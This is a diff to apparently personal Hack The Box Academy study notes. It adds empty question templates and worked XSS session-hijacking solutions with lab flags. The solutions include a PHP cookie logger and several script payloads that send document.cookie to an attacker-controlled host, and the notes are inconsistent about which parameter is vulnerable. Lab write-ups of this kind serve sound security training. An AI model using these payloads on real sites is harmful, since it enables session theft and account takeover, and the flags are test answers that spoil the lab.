@@ -1221,6 +1221,125 @@ Results: cr3n4o7rzse7rzhnckhssncif7ds
 
 ## [Information Gathering - Web Edition](https://academy.hackthebox.com/module/details/144)
 
+
+### WHOIS
+
+#### Utilizing WHOIS
+
+Question
+
+```
+
+```
+
+Results: 
+
+
+### DNS & Subdomains
+
+#### Digging DNS
+
+
+Question
+
+```
+
+```
+
+Results: 
+
+
+#### Subdomain BruteForcing
+
+Question
+
+```
+
+```
+
+Results: 
+
+#### DNS Zone Transfers
+
+Question
+
+```
+
+```
+
+Results: 
+
+
+#### Virtual Hosts
+
+Question
+
+```
+
+```
+
+Results: 
+
+
+### Fingerprinting
+
+#### Fingerprinting
+
+Question
+
+```
+
+```
+
+Results: 
+
+### Crawling
+
+#### Creepy crawlies
+
+Question
+
+```
+
+```
+
+Results: 
+
+### Web Archives
+
+Question
+
+```
+
+```
+
+Results: 
+
+### Automating Recon
+
+Question
+
+```
+
+```
+
+Results: 
+
+### Skills Assessment
+
+Question
+
+```
+
+```
+
+Results: 
+
+
+
+
+
+
 ## [Vulnerability Assessment](https://academy.hackthebox.com/module/details/108)
 
 ## [File Transfers](https://academy.hackthebox.com/module/details/24)
@@ -1352,39 +1471,120 @@ Results: HTB{r3f13c73d_cr3d5_84ck_2_m3}
 
 #### Session Hijacking
 
+**Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.**
 
-Question
+Create a file index.php in the attacker machine:
 
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
 ```
 
+Have a php server listening:
+
+```bash
+sudo php -S 0.0.0.0:80
 ```
 
-Results: 
+
+Enter $ip/hijacking and enter this payload in every field. Use the field name (username, name, surname...) as `<custom.name>` when different payloads:
+
+```html
+<script>document.location=%27http://attackerIP/index.php?c=%27+document.cookie</script>
+```
+
+
+
+If successful, you will see a connection in your php server like this:
+
+![xss blind](img/xss_blind_00.png)
+
+Then, `profile` would be the vulnerable input (parameter `imgurl`). The URL:
+
+```
+http://VICTIMIP/hijacking/?fullname=Lala%20lalasurname%2Ffullname%3C%2Fscript%3E&username=%22%3E%3Cscript+src%3Dhttp%3A%2F%2FAttackerIP%2Fusername%3C%2Fscript%3E&password=lala&email=lala%40gmail.com&imgurl=%22%3E%3Cscript%20src=%22http://AttackerIP/lala.js%22%3E%3C/script%3E
+```
+
+Beside the index.php, have a lala.js in your php server:
+
+```js
+new Image().src='http://attackerIP/index.php?c='+document.cookie
+```
+
+Run your php server:
+
+```bash
+sudo php -S 0.0.0.0:80
+```
+
+Now, we can change the URL in the XSS payload we found earlier to use `lala.js`. For instance:
+
+```html
+<script src=http://attackerIP/lala.js></script>
+```
+
+You will log the following activity in your php server:
+
+![xss blind](img/xss_blind_02.png)
+
+
+Results:  HTB{4lw4y5_53cur3_y0ur_c00k135}
+
 
 ### XSS Prevention
-
-
-Question
-
-```
-
-```
-
-Results: 
 
 ####  Skills Assessment
 
 
-Question
+**What is the value of the 'flag' cookie?**
 
+Enter payload in all form fields. The vulnerable one is `website` with the payload
+
+```html
+<script src='http://attackerIP/website'></script>
 ```
 
+I have a php server running, with this index.php:
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
 ```
 
-Results: 
+I know that it is the parameter `webserver` because of this:
 
+![xss_blind_01](img/xss_blind_01.png)
 
-### Skills Assessment
+Now, I have also this file lala.js in my server:
+
+```
+<script src='http://attackerIP/lala.js'></script>
+```
+
+And in my php server:
+
+![xss_blind_03](img/xss_blind_03.png)
+
+Results:  HTB{cr055_5173_5cr1p71n6_n1nj4}
+
 
 
 
@@ -1414,4 +1614,13 @@ Results:
 
 ##  [Attacking Enterprise Networks](https://academy.hackthebox.com/module/details/163)
 
+
+
+Question
+
+```
+
+```
+
+Results: 
 
